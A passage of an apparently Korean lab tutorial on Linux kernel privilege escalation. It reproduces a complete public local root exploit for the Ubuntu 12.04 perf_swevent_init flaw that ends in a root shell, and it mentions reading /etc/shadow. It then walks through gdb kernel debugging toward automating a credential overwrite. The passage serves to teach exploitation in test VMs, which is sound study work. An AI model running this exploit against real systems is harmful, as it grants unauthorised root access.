</pre></table></code></div></div><p>권한 상승을 통한 <code class="language-plaintext highlighter-rouge">/etc/shadow</code> 파일 읽기에 성공하였다.</p><h1 id="do-lpe---automated">do: LPE() - automated</h1><p><code class="language-plaintext highlighter-rouge">TestVM</code>의 <code class="language-plaintext highlighter-rouge">/home/test/exercises/perf</code> 위치에 <code class="language-plaintext highlighter-rouge">perf_swevent_init</code> 함수의 취약점을 이용한 Ubuntu 12.04 <a href="https://www.exploit-db.com/exploits/33589">LPE Exploit PoC</a>가 존재한다.</p><p><strong>190926 추가</strong> <a href="http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/">이 링크</a>에 해당 취약점의 자세한 분석이 존재한다. 참고하면 좋을듯!</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/perf<span class="nv">$ </span><span class="nb">ls
</span>vnik_v1  vnik_v1.c
<span class="nb">test</span>@ubuntu:~/exercises/perf<span class="err">$</span>
</pre></table></code></div></div><p><strong>vnik_v1.c</strong></p><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
</pre><td class="rouge-code"><pre><span class="cm">/**
 * Ubuntu 12.04 3.x x86_64 perf_swevent_init Local root exploit
 * by Vitaly Nikolenko (vnik5287@gmail.com)
 *
 * based on semtex.c by sd
 *
 * Supported targets:
 * [0] Ubuntu 12.04.0 - 3.2.0-23-generic
 * [1] Ubuntu 12.04.1 - 3.2.0-29-generic
 * [2] Ubuntu 12.04.2 - 3.5.0-23-generic
 *
 * $ gcc vnik.c -O2 -o vnik
 *
 * $ uname -r
 * 3.2.0-23-generic
 *
 * $ ./vnik 0
 */</span>

<span class="cp">#define _GNU_SOURCE 1
#include &lt;stdint.h&gt;
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;syscall.h&gt;
#include &lt;stdint.h&gt;
#include &lt;assert.h&gt;
</span>
<span class="cp">#define BASE  0x1780000000
#define SIZE  0x0010000000
#define KSIZE 0x2000000
#define AB(x) ((uint64_t)((0xababababLL&lt;&lt;32)^((uint64_t)((x)*313337))))
</span>
<span class="k">typedef</span> <span class="kt">int</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">commit_creds_fn</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>
<span class="k">typedef</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="p">(</span><span class="o">*</span><span class="n">prepare_kernel_cred_fn</span><span class="p">)(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">cred</span><span class="p">);</span>

<span class="kt">uint64_t</span> <span class="n">targets</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span>
            <span class="p">{</span>
	     <span class="p">{</span><span class="mh">0xffffffff81ef67e0</span><span class="p">,</span>  <span class="c1">// perf_swevent_enabled</span>
              <span class="mh">0xffffffff81091630</span><span class="p">,</span>  <span class="c1">// commit_creds</span>
              <span class="mh">0xffffffff810918e0</span><span class="p">},</span> <span class="c1">// prepare_kernel_cred</span>
             <span class="p">{</span><span class="mh">0xffffffff81ef67a0</span><span class="p">,</span>
              <span class="mh">0xffffffff81091220</span><span class="p">,</span>
              <span class="mh">0xffffffff810914d0</span><span class="p">},</span>
             <span class="p">{</span><span class="mh">0xffffffff81ef5940</span><span class="p">,</span>
              <span class="mh">0xffffffff8107ee30</span><span class="p">,</span>
              <span class="mh">0xffffffff8107f0c0</span><span class="p">}</span>
	    <span class="p">};</span>

<span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="n">payload</span><span class="p">()</span> <span class="p">{</span>
	<span class="kt">uint32_t</span> <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
	<span class="c1">// restore the handler</span>
	<span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
	<span class="n">commit_creds_fn</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="p">(</span><span class="n">commit_creds_fn</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
	<span class="n">prepare_kernel_cred_fn</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="p">(</span><span class="n">prepare_kernel_cred_fn</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
	<span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="nb">NULL</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">trigger</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">off</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">buf</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x4800000001</span><span class="p">,</span> <span class="n">off</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x300</span> <span class="p">};</span>
	<span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">syscall</span><span class="p">(</span><span class="mi">298</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span> <span class="o">!</span><span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
	<span class="kt">uint64_t</span> <span class="n">off64</span><span class="p">,</span> <span class="n">needle</span><span class="p">,</span> <span class="n">kbase</span><span class="p">,</span> <span class="o">*</span><span class="n">p</span><span class="p">;</span>
	<span class="kt">uint8_t</span> <span class="o">*</span><span class="n">code</span><span class="p">;</span>
	<span class="kt">uint32_t</span> <span class="n">int_n</span><span class="p">,</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">5</span><span class="p">,</span> <span class="n">target</span> <span class="o">=</span> <span class="mi">1337</span><span class="p">;</span>
	<span class="kt">int</span> <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
	<span class="kt">void</span> <span class="o">*</span><span class="n">map</span><span class="p">;</span>

	<span class="n">assert</span><span class="p">(</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="s">"target?"</span><span class="p">);</span>
	<span class="n">assert</span><span class="p">(</span> <span class="p">(</span><span class="n">target</span> <span class="o">=</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="o">&lt;</span> <span class="mi">3</span> <span class="p">);</span>

	<span class="k">struct</span> <span class="p">{</span>
		<span class="kt">uint16_t</span> <span class="n">limit</span><span class="p">;</span>
		<span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">;</span>
	<span class="p">}</span> <span class="n">__attribute__</span><span class="p">((</span><span class="n">packed</span><span class="p">))</span> <span class="n">idt</span><span class="p">;</span>

	<span class="c1">// mmap user-space block so we don't page fault</span>
	<span class="c1">// on sw_perf_event_destroy</span>
	<span class="n">assert</span><span class="p">((</span><span class="n">map</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">BASE</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">map</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">SIZE</span><span class="p">);</span>

	<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"sidt %0"</span> <span class="o">:</span> <span class="s">"=m"</span> <span class="p">(</span><span class="n">idt</span><span class="p">));</span>
	<span class="n">kbase</span> <span class="o">=</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mh">0xff000000</span><span class="p">;</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"IDT addr = 0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">idt</span><span class="p">.</span><span class="n">addr</span><span class="p">);</span>

	<span class="n">assert</span><span class="p">((</span><span class="n">code</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">mmap</span><span class="p">((</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kbase</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">==</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">kbase</span><span class="p">);</span>
	<span class="n">memset</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="n">KSIZE</span><span class="p">);</span> <span class="n">code</span> <span class="o">+=</span> <span class="n">KSIZE</span><span class="o">-</span><span class="mi">1024</span><span class="p">;</span> <span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">payload</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
	<span class="n">memcpy</span><span class="p">(</span><span class="n">code</span><span class="o">-</span><span class="mi">13</span><span class="p">,</span><span class="s">"</span><span class="se">\x0f\x01\xf8\xe8\5\0\0\0\x0f\x01\xf8\x48\xcf</span><span class="s">"</span><span class="p">,</span> <span class="mi">13</span><span class="p">);</span>

	<span class="c1">// can only play with interrupts 3, 4 and 0x80</span>
	<span class="k">for</span> <span class="p">(</span><span class="n">int_n</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span> <span class="n">int_n</span> <span class="o">&lt;=</span> <span class="mh">0x80</span><span class="p">;</span> <span class="n">int_n</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="k">for</span> <span class="p">(</span><span class="n">off64</span> <span class="o">=</span> <span class="mh">0x00000000ffffffff</span><span class="p">;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">off64</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">;</span> <span class="n">off64</span><span class="o">--</span><span class="p">)</span> <span class="p">{</span>
			<span class="kt">int</span> <span class="n">off32</span> <span class="o">=</span> <span class="n">off64</span><span class="p">;</span>

			<span class="k">if</span> <span class="p">((</span><span class="n">targets</span><span class="p">[</span><span class="n">target</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="n">off32</span><span class="p">)</span><span class="o">*</span><span class="mi">24</span><span class="p">)</span> <span class="o">==</span> <span class="p">(</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">+</span> <span class="n">int_n</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="p">{</span>
				<span class="n">offset</span> <span class="o">=</span> <span class="n">off32</span><span class="p">;</span>
				<span class="k">goto</span> <span class="n">out</span><span class="p">;</span>
			<span class="p">}</span>
		<span class="p">}</span>
		<span class="k">if</span> <span class="p">(</span><span class="n">int_n</span> <span class="o">==</span> <span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
			<span class="c1">// shit, let's try 0x80 if the kernel is compiled with</span>
			<span class="c1">// CONFIG_IA32_EMULATION</span>
			<span class="n">int_n</span> <span class="o">=</span> <span class="mh">0x80</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
		<span class="p">}</span>
	<span class="p">}</span>
<span class="nl">out:</span>
	<span class="n">assert</span><span class="p">(</span><span class="n">offset</span><span class="p">);</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"Using int = %d with offset = %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">int_n</span><span class="p">,</span> <span class="n">offset</span><span class="p">);</span>

	<span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
		<span class="n">needle</span> <span class="o">=</span> <span class="n">AB</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
		<span class="n">assert</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">memmem</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">needle</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
		<span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="o">!</span><span class="n">j</span> <span class="o">?</span> <span class="p">(</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">+</span> <span class="n">int_n</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">:</span> <span class="n">targets</span><span class="p">[</span><span class="n">target</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
	<span class="p">}</span>
	<span class="n">trigger</span><span class="p">(</span><span class="n">offset</span><span class="p">);</span>
	<span class="k">switch</span> <span class="p">(</span><span class="n">int_n</span><span class="p">)</span> <span class="p">{</span>
	<span class="k">case</span> <span class="mi">3</span><span class="p">:</span>
		<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"int $0x03"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mi">4</span><span class="p">:</span>
		<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"int $0x04"</span><span class="p">);</span>
		<span class="k">break</span><span class="p">;</span>
	<span class="k">case</span> <span class="mh">0x80</span><span class="p">:</span>
		<span class="n">asm</span> <span class="k">volatile</span><span class="p">(</span><span class="s">"int $0x80"</span><span class="p">);</span>
	<span class="p">}</span>

	<span class="n">assert</span><span class="p">(</span><span class="o">!</span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">));</span>
	<span class="k">return</span> <span class="n">execl</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">,</span> <span class="s">"-sh"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>이번에는 <code class="language-plaintext highlighter-rouge">payload</code>함수의 <code class="language-plaintext highlighter-rouge">perf_swevent_init</code>, <code class="language-plaintext highlighter-rouge">commit_creds</code>, <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code>의 심볼 주소를 가져오는 부분을 자동화 해보도록 하자.</p><p>원래 PoC에서는 심볼 주소를 두곳에서 설정한다.</p><ol><li><code class="language-plaintext highlighter-rouge">payload()</code><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre> <span class="kt">void</span> <span class="nf">__attribute__</span><span class="p">((</span><span class="n">regparm</span><span class="p">(</span><span class="mi">3</span><span class="p">)))</span> <span class="n">payload</span><span class="p">()</span> <span class="p">{</span>
     <span class="kt">uint32_t</span> <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
     <span class="c1">// restore the handler</span>
     <span class="o">*</span><span class="n">fixptr</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
     <span class="n">commit_creds_fn</span> <span class="n">commit_creds</span> <span class="o">=</span> <span class="p">(</span><span class="n">commit_creds_fn</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
     <span class="n">prepare_kernel_cred_fn</span> <span class="n">prepare_kernel_cred</span> <span class="o">=</span> <span class="p">(</span><span class="n">prepare_kernel_cred_fn</span><span class="p">)</span><span class="n">AB</span><span class="p">(</span><span class="mi">3</span><span class="p">);</span>
     <span class="n">commit_creds</span><span class="p">(</span><span class="n">prepare_kernel_cred</span><span class="p">((</span><span class="kt">uint64_t</span><span class="p">)</span><span class="nb">NULL</span><span class="p">));</span>
 <span class="p">}</span>
</pre></table></code></div></div><p>이 함수에서 <code class="language-plaintext highlighter-rouge">fixptr</code>이라는 변수명으로 <code class="language-plaintext highlighter-rouge">perf_swevent_enabled</code> 주소를 가져오고, 해당 값을 -1로 설정한다. 이후 <code class="language-plaintext highlighter-rouge">commit_creds</code>와 <code class="language-plaintext highlighter-rouge">prepare_kernel_cred</code> 주소를 가져와 권한 상승 과정의 핵심인 <code class="language-plaintext highlighter-rouge">commit_creds(prepare_kernel_cred(0));</code>를 실행하게 된다.</p><p>이 부분에서 <code class="language-plaintext highlighter-rouge">AB(x)</code> 매크로 호출을 통해, 실제 가젯이 들어가야 할 부분을 특수한 더미 값으로 채우는데, 디버깅 할때 메모리 서치를 편하게 하기 위해서인지, 아니면 <code class="language-plaintext highlighter-rouge">-O2</code> 옵션을 통해 컴파일 최적화를 할 때 가젯을 불러오는 부분에 최적화가 수행되어 원하지 않는 동작을 유발하는건지 모르겠지만, 특수한 더미 값이 실제 가젯이 존재해야 할 위치에 쓰이게 된다.</p><li><code class="language-plaintext highlighter-rouge">main()</code><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre> <span class="k">for</span> <span class="p">(</span><span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">j</span> <span class="o">&lt;</span> <span class="mi">3</span><span class="p">;</span> <span class="n">j</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
     <span class="n">needle</span> <span class="o">=</span> <span class="n">AB</span><span class="p">(</span><span class="n">j</span><span class="o">+</span><span class="mi">1</span><span class="p">);</span>
     <span class="n">assert</span><span class="p">(</span><span class="n">p</span> <span class="o">=</span> <span class="n">memmem</span><span class="p">(</span><span class="n">code</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">needle</span><span class="p">,</span> <span class="mi">8</span><span class="p">));</span>
     <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="o">!</span><span class="n">j</span> <span class="o">?</span> <span class="p">(</span><span class="n">idt</span><span class="p">.</span><span class="n">addr</span> <span class="o">+</span> <span class="n">int_n</span> <span class="o">*</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">:</span> <span class="n">targets</span><span class="p">[</span><span class="n">target</span><span class="p">][</span><span class="n">j</span><span class="p">];</span>
 <span class="p">}</span>
</pre></table></code></div></div><p><strong>(1)</strong> 에서 <code class="language-plaintext highlighter-rouge">AB(x)</code> 매크로를 통해 설정한 더미 값을 실제 가젯으로 바꿔주는 부분이다.</p></ol><p>가젯을 설정해주는 부분까지 확인했으니, 가젯 주소 설정을 자동화 해보자. 이번에는 <a href="#do-lpe">do: LPE()</a> 에서 했던 방식과는 조금 다르게, <code class="language-plaintext highlighter-rouge">rsp</code> 레지스터가 가지고 있는 Stack 주소를 활용하여 <a href="#privilege-escalation">Privilege Escalation</a> 의 그림에 설명되어 있던 <code class="language-plaintext highlighter-rouge">(r|e)sp &amp; ~(THREAD_SIZE-1)</code> 연산을 통해 <code class="language-plaintext highlighter-rouge">thread_info</code> 구조체의 주소를 가져온 후, <code class="language-plaintext highlighter-rouge">task_struct</code>, <code class="language-plaintext highlighter-rouge">real_cred</code> 순으로 가져와 <code class="language-plaintext highlighter-rouge">real_cred</code> 구조체 내의 <code class="language-plaintext highlighter-rouge">uid</code> <code class="language-plaintext highlighter-rouge">euid</code> 값을 변경해 줄 것이다.</p><p>gdb를 통해 위 과정을 한번 진행해보고, 인라인 어셈블리를 PoC 코드에 넣어 <code class="language-plaintext highlighter-rouge">uid</code> <code class="language-plaintext highlighter-rouge">euid</code> 값을 <code class="language-plaintext highlighter-rouge">0</code>으로 설정하도록 자동화하자.</p><p>일단 <code class="language-plaintext highlighter-rouge">MasterVM</code>에서 gdb를 켠 후, <code class="language-plaintext highlighter-rouge">TestVM</code>에 attach한다. PoC 코드의 <code class="language-plaintext highlighter-rouge">trigger</code> 함수에서 <code class="language-plaintext highlighter-rouge">298</code>번 syscall을 통해 취약점을 트리거링하므로 <code class="language-plaintext highlighter-rouge">sys_perf_event_open</code> 함수<sup id="fnref:x64_syscall_table" role="doc-noteref"><a href="#fn:x64_syscall_table" class="footnote" rel="footnote">1</a></sup>에 bp를 건다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>root@master:~# gdb kernels/vmlinux-3.5.0-23-generic <span class="nt">-q</span>
Reading symbols from kernels/vmlinux-3.5.0-23-generic...done.
<span class="o">(</span>gdb<span class="o">)</span> target remote 192.168.94.1:8864
Remote debugging using 192.168.94.1:8864
native_safe_halt <span class="o">()</span>
    at /build/buildd/linux-lts-quantal-3.5.0/arch/x86/include/asm/irqflags.h:50
warning: Source file is more recent than executable.
50	<span class="o">}</span>
<span class="o">(</span>gdb<span class="o">)</span> b <span class="k">*</span> sys_perf_event_open
Breakpoint 1 at 0xffffffff811209d0: file /build/buildd/linux-lts-quantal-3.5.0/kernel/events/core.c, line 6198.
<span class="o">(</span>gdb<span class="o">)</span> c
Continuing.
</pre></table></code></div></div><p>이제 <code class="language-plaintext highlighter-rouge">TestVM</code>에서 <code class="language-plaintext highlighter-rouge">vnik</code> 바이너리를 실행하여 <code class="language-plaintext highlighter-rouge">trigger()</code>가 호출하는 <code class="language-plaintext highlighter-rouge">sys_perf_event_open()</code>에서 bp가 걸리는지 확인한다.</p><p><strong>TestVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="nb">test</span>@ubuntu:~/exercises/perf<span class="nv">$ </span><span class="nb">ls
</span>vnik  vnik_v1.c
<span class="nb">test</span>@ubuntu:~/exercises/perf<span class="nv">$ </span>./vnik 2
IDT addr <span class="o">=</span> 0xffffffff81dd6000
</pre></table></code></div></div><p><strong>MasterVM</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> c
Continuing.

Breakpoint 1, sys_perf_event_open <span class="o">(</span><span class="nv">attr_uptr</span><span class="o">=</span>0x7fff1febfbd0, <span class="nv">pid</span><span class="o">=</span>0,
    <span class="nv">cpu</span><span class="o">=</span><span class="nt">-1</span>, <span class="nv">group_fd</span><span class="o">=</span><span class="nt">-1</span>, <span class="nv">flags</span><span class="o">=</span>0<span class="o">)</span>
    at /build/buildd/linux-lts-quantal-3.5.0/kernel/events/core.c:6198
warning: Source file is more recent than executable.
6198	<span class="o">{</span>
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p>bp가 정상적으로 걸렸으므로, <code class="language-plaintext highlighter-rouge">i r rsp</code> 명령을 통해 <code class="language-plaintext highlighter-rouge">rsp</code> 레지스터 값을 확인한다.</p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> i r rsp
rsp            0xffff88007814bf80	0xffff88007814bf80
<span class="o">(</span>gdb<span class="o">)</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">thread_info</code>의 주소는 <code class="language-plaintext highlighter-rouge">(r|e)sp &amp; ~(THREAD_SIZE-1)</code>이고, x64에서 <code class="language-plaintext highlighter-rouge">THREAD_SIZE</code>는 8K이므로 간단한 계산을 해보자.</p><blockquote><p><code class="language-plaintext highlighter-rouge">1024(0x400) * 8</code> =&gt; <code class="language-plaintext highlighter-rouge">0x2000</code></p><p><code class="language-plaintext highlighter-rouge">0x2000 - 1</code> =&gt; <code class="language-plaintext highlighter-rouge">0x1FFF</code></p><p><code class="language-plaintext highlighter-rouge">~ 0x1FFF</code> =&gt; <code class="language-plaintext highlighter-rouge">0xFFFFFFFFFFFFE000</code></p><p><code class="language-plaintext highlighter-rouge">0xffff88007814bf80 &amp; 0xFFFFFFFFFFFFE000</code> =&gt; <code class="language-plaintext highlighter-rouge">&amp;thread_info</code></p></blockquote><p>계산 결과 <code class="language-plaintext highlighter-rouge">0xffff88007814a000</code>이라는 주소값이 나왔다. gdb를 통해 <code class="language-plaintext highlighter-rouge">thread_info</code>의 주소가 맞는지 확인해보자.</p><p><strong>thread_info</strong></p><div class="language-sh highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="o">(</span>gdb<span class="o">)</span> p <span class="o">(</span>struct thread_info <span class="k">*</span><span class="o">)</span>0xffff88007814a000
<span class="nv">$1</span> <span class="o">=</span> <span class="o">(</span>struct thread_info <span class="k">*</span><span class="o">)</span> 0xffff88007814a000
<span class="o">(</span>gdb<span class="o">)</span> p <span class="k">*</span><span class="nv">$1</span>
<span class="nv">$2</span> <span class="o">=</span> <span class="o">{</span>task <span class="o">=</span> 0xffff88007924dc00,
  exec_domain <span class="o">=</span> 0xffffffff81c1f2e0 &lt;default_exec_domain&gt;, flags <span class="o">=</span> 0,
  status <span class="o">=</span> 0, cpu <span class="o">=</span> 0, preempt_count <span class="o">=</span> 0, addr_limit <span class="o">=</span> <span class="o">{</span>
    seg <span class="o">=</span> 140737488351232<span class="o">}</span>, restart_block <span class="o">=</span> <span class="o">{</span>
    fn <span class="o">=</span> 0xffffffff81069a40 &lt;do_no_restart_syscall&gt;, <span class="o">{</span>futex <span class="o">=</span> <span class="o">{</span>
        uaddr <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, val <span class="o">=</span> 0, flags <span class="o">=</span> 0,
        bitset <span class="o">=</span> 0, <span class="nb">time</span> <span class="o">=</span> 0, uaddr2 <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;<span class="o">}</span>,
      nanosleep <span class="o">=</span> <span class="o">{</span>clockid <span class="o">=</span> 0, rmtp <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;,
        compat_rmtp <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, expires <span class="o">=</span> 0<span class="o">}</span>, poll <span class="o">=</span> <span class="o">{</span>
        ufds <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, nfds <span class="o">=</span> 0, has_timeout <span class="o">=</span> 0,
        tv_sec <span class="o">=</span> 0, tv_nsec <span class="o">=</span> 0<span class="o">}}}</span>,
  sysenter_return <span class="o">=</span> 0x0 &lt;irq_stack_union&gt;, sig_on_uaccess_error <span class="o">=</span> 0,
  uaccess_err <span class="o">=</span> 0<span class="o">}</span>
<span class="o">(</span>gdb<span class="o">)</span>
